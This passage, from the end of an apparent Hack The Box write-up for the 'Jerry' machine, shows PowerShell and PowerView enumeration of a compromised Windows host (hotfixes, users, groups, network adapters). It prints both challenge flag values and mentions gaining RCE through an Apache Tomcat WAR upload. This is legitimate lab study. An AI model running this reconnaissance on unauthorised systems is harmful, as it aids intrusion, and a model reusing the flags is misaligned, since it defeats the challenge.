+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-HotFix</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HotFixID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">KB2868626
+</span><span class="z-text z-plain">KB2883200
+</span><span class="z-text z-plain">KB2887595
+</span><span class="z-text z-plain">KB2894856
+</span><span class="z-text z-plain">KB2903939
+</span><span class="z-text z-plain">KB2911106
+</span><span class="z-text z-plain">KB2919355
+</span><span class="z-text z-plain">KB2919394
+</span><span class="z-text z-plain">KB2928680
+</span><span class="z-text z-plain">KB2938066
+</span><span class="z-text z-plain">KB2954879
+</span><span class="z-text z-plain">KB2967917
+</span><span class="z-text z-plain">KB2977765
+</span><span class="z-text z-plain">KB2978041
+</span><span class="z-text z-plain">KB2978126
+</span><span class="z-text z-plain">KB2989930
+</span><span class="z-text z-plain">KB3000850
+</span><span class="z-text z-plain">KB3003057
+</span><span class="z-text z-plain">KB3004365
+</span><span class="z-text z-plain">KB3004545
+</span><span class="z-text z-plain">KB3012235
+</span><span class="z-text z-plain">KB3012702
+</span><span class="z-text z-plain">KB3013172
+</span><span class="z-text z-plain">KB3013531
+</span><span class="z-text z-plain">KB3013538
+</span><span class="z-text z-plain">KB3013769
+</span><span class="z-text z-plain">KB3013791
+</span><span class="z-text z-plain">KB3013816
+</span><span class="z-text z-plain">KB3014442
+</span><span class="z-text z-plain">KB3015696
+</span><span class="z-text z-plain">KB3018133
+</span><span class="z-text z-plain">KB3019978
+</span><span class="z-text z-plain">KB3021910
+</span><span class="z-text z-plain">KB3023222
+</span><span class="z-text z-plain">KB3023266
+</span><span class="z-text z-plain">KB3024751
+</span><span class="z-text z-plain">KB3024755
+</span><span class="z-text z-plain">KB3029603
+</span><span class="z-text z-plain">KB3030947
+</span><span class="z-text z-plain">KB3032663
+</span><span class="z-text z-plain">KB3033446
+</span><span class="z-text z-plain">KB3035126
+</span><span class="z-text z-plain">KB3036612
+</span><span class="z-text z-plain">KB3037579
+</span><span class="z-text z-plain">KB3037924
+</span><span class="z-text z-plain">KB3038002
+</span><span class="z-text z-plain">KB3042085
+</span><span class="z-text z-plain">KB3044374
+</span><span class="z-text z-plain">KB3044673
+</span><span class="z-text z-plain">KB3045634
+</span><span class="z-text z-plain">KB3045685
+</span><span class="z-text z-plain">KB3045717
+</span><span class="z-text z-plain">KB3045719
+</span><span class="z-text z-plain">KB3045755
+</span><span class="z-text z-plain">KB3045999
+</span><span class="z-text z-plain">KB3046017
+</span><span class="z-text z-plain">KB3046737
+</span><span class="z-text z-plain">KB3054169
+</span><span class="z-text z-plain">KB3054203
+</span><span class="z-text z-plain">KB3054256
+</span><span class="z-text z-plain">KB3054464
+</span><span class="z-text z-plain">KB3055323
+</span><span class="z-text z-plain">KB3055343
+</span><span class="z-text z-plain">KB3055642
+</span><span class="z-text z-plain">KB3059317
+</span><span class="z-text z-plain">KB3060681
+</span><span class="z-text z-plain">KB3060793
+</span><span class="z-text z-plain">KB3061512
+</span><span class="z-text z-plain">KB3063843
+</span><span class="z-text z-plain">KB3071756
+</span><span class="z-text z-plain">KB3074228
+</span><span class="z-text z-plain">KB3074548
+</span><span class="z-text z-plain">KB3076949
+</span><span class="z-text z-plain">KB3077715
+</span><span class="z-text z-plain">KB3078405
+</span><span class="z-text z-plain">KB3078676
+</span><span class="z-text z-plain">KB3080149
+</span><span class="z-text z-plain">KB3082089
+</span><span class="z-text z-plain">KB3084135
+</span><span class="z-text z-plain">KB3084905
+</span><span class="z-text z-plain">KB3086255
+</span><span class="z-text z-plain">KB3087041
+</span><span class="z-text z-plain">KB3087137
+</span><span class="z-text z-plain">KB3091297
+</span><span class="z-text z-plain">KB3094486
+</span><span class="z-text z-plain">KB3095701
+</span><span class="z-text z-plain">KB3097997
+</span><span class="z-text z-plain">KB3098779
+</span><span class="z-text z-plain">KB3099834
+</span><span class="z-text z-plain">KB3100473
+</span><span class="z-text z-plain">KB3102429
+</span><span class="z-text z-plain">KB3103616
+</span><span class="z-text z-plain">KB3103696
+</span><span class="z-text z-plain">KB3103709
+</span><span class="z-text z-plain">KB3109103
+</span><span class="z-text z-plain">KB3109560
+</span><span class="z-text z-plain">KB3109976
+</span><span class="z-text z-plain">KB3110329
+</span><span class="z-text z-plain">KB3115224
+</span><span class="z-text z-plain">KB3121261
+</span><span class="z-text z-plain">KB3121461
+</span><span class="z-text z-plain">KB3123245
+</span><span class="z-text z-plain">KB3126434
+</span><span class="z-text z-plain">KB3126587
+</span><span class="z-text z-plain">KB3133043
+</span><span class="z-text z-plain">KB3133690
+</span><span class="z-text z-plain">KB3134179
+</span><span class="z-text z-plain">KB3134815
+</span><span class="z-text z-plain">KB3137728
+</span><span class="z-text z-plain">KB3138378
+</span><span class="z-text z-plain">KB3138602
+</span><span class="z-text z-plain">KB3138910
+</span><span class="z-text z-plain">KB3138962
+</span><span class="z-text z-plain">KB3139164
+</span><span class="z-text z-plain">KB3139398
+</span><span class="z-text z-plain">KB3139914
+</span><span class="z-text z-plain">KB3140219
+</span><span class="z-text z-plain">KB3140234
+</span><span class="z-text z-plain">KB3145384
+</span><span class="z-text z-plain">KB3145432
+</span><span class="z-text z-plain">KB3146604
+</span><span class="z-text z-plain">KB3146723
+</span><span class="z-text z-plain">KB3146751
+</span><span class="z-text z-plain">KB3147071
+</span><span class="z-text z-plain">KB3155784
+</span><span class="z-text z-plain">KB3156059
+</span><span class="z-text z-plain">KB3159398
+</span><span class="z-text z-plain">KB3161949
+</span><span class="z-text z-plain">KB3162343
+</span><span class="z-text z-plain">KB3172614
+</span><span class="z-text z-plain">KB3172729
+</span><span class="z-text z-plain">KB3173424
+</span><span class="z-text z-plain">KB3175024
+</span><span class="z-text z-plain">KB3178539
+</span><span class="z-text z-plain">KB3179574
+</span><span class="z-text z-plain">KB3185319
+</span><span class="z-text z-plain">KB4033369
+</span><span class="z-text z-plain">KB4033428
+</span><span class="z-text z-plain">KB4054854
+</span><span class="z-text z-plain">KB4096417
+</span><span class="z-text z-plain">KB4287903
+</span><span class="z-text z-plain">KB4284815
+</span></code></pre>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Users<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<p>There's no user.</p>
+<p>What about the administrators?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Administrators<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">MemberName          SID                                       
+</span><span class="z-text z-plain">----------          ---                                       
+</span><span class="z-text z-plain">JERRY\Administrator S-1-5-21-2323042369-1334567395-6350930-50
+</span></code></pre>
+<p>There's only the built-in <code>Administrator</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups, once again using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroup</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>GroupName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Comment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName                           Comment
+</span><span class="z-text z-plain">---------                           -------
+</span><span class="z-text z-plain">Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
+</span><span class="z-text z-plain">Administrators                      Administrators have complete and unrestricted access to the computer/domain
+</span><span class="z-text z-plain">Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+</span><span class="z-text z-plain">Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
+</span><span class="z-text z-plain">Cryptographic Operators             Members are authorized to perform cryptographic operations.
+</span><span class="z-text z-plain">Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
+</span><span class="z-text z-plain">Event Log Readers                   Members of this group can read event logs from local machine
+</span><span class="z-text z-plain">Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+</span><span class="z-text z-plain">Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
+</span><span class="z-text z-plain">IIS_IUSRS                           Built-in group used by Internet Information Services.
+</span><span class="z-text z-plain">Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
+</span><span class="z-text z-plain">Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+</span><span class="z-text z-plain">Performance Monitor Users           Members of this group can access performance counter data locally and remotely
+</span><span class="z-text z-plain">Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
+</span><span class="z-text z-plain">Print Operators                     Members can administer printers installed on domain controllers
+</span><span class="z-text z-plain">RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
+</span><span class="z-text z-plain">RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
+</span><span class="z-text z-plain">RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
+</span><span class="z-text z-plain">Remote Desktop Users                Members in this group are granted the right to logon remotely
+</span><span class="z-text z-plain">Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span><span class="z-text z-plain">Replicator                          Supports file replication in a domain      
+</span><span class="z-text z-plain">Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
+</span><span class="z-text z-plain">WinRMRemoteWMIUsers__               Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> ipconfig <span class="z-keyword z-operator z-assignment z-powershell">/</span>all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : JERRY
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Hybrid
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   DNS Suffix Search List. . . . . . : htb
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Ethernet0:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : htb
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-02-18
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">   IPv6 Address. . . . . . . . . . . : dead:beef::21f(Preferred) 
+</span><span class="z-text z-plain">   Lease Obtained. . . . . . . . . . : Saturday, February 3, 2024 11:49:10 PM
+</span><span class="z-text z-plain">   Lease Expires . . . . . . . . . . : Sunday, February 4, 2024 1:19:09 AM
+</span><span class="z-text z-plain">   IPv6 Address. . . . . . . . . . . : dead:beef::7184:7057:9aab:aaf0(Preferred) 
+</span><span class="z-text z-plain">   Link-local IPv6 Address . . . . . : fe80::7184:7057:9aab:aaf0%11(Preferred) 
+</span><span class="z-text z-plain">   IPv4 Address. . . . . . . . . . . : 10.10.10.95(Preferred) 
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:1014%11
+</span><span class="z-text z-plain">                                       10.10.10.2
+</span><span class="z-text z-plain">   DHCPv6 IAID . . . . . . . . . . . : 167792726
+</span><span class="z-text z-plain">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-50-6D-2D-00-50-56-B9-02-18
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix Search List :
+</span><span class="z-text z-plain">                                       htb
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Tunnel adapter isatap.{E6565A26-EF2E-43A5-A579-B0F25E7B1DC8}:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Media State . . . . . . . . . . . : Media disconnected
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : htb
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span></code></pre>
+<p>There's an Ethernet interface and an ISATAP interface.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check <code>Administrator</code>'s Desktop folder, we find a <code>flags</code> folder
+containing a <code>2 for the price of 1.txt</code> file, which contains both the user and
+root flags.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\apache<span class="z-keyword z-operator z-assignment z-powershell">-</span>tomcat<span class="z-keyword z-operator z-assignment z-powershell">-</span><span class="z-constant z-numeric z-integer z-powershell">7.0</span>.<span class="z-constant z-numeric z-integer z-powershell">88</span><span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-Content</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">user.txt
+</span><span class="z-text z-plain">7004dbcef0f854e0fb401875f26ebd00
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">root.txt
+</span><span class="z-text z-plain">04a8b36e1545a455393d067e772fe90e
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/jerry/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated both the user and root flags as 'Piece of cake' to obtain. The foothold
+was extremely easy to identify and to exploit, as obtaining RCE with Apache
+Tomcat through WAR file upload is a classic, and it even granted us access to
+the system as <code>NT AUTHORITY\SYSTEM</code>, so there was no need to escalate privileges
+afterwards.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
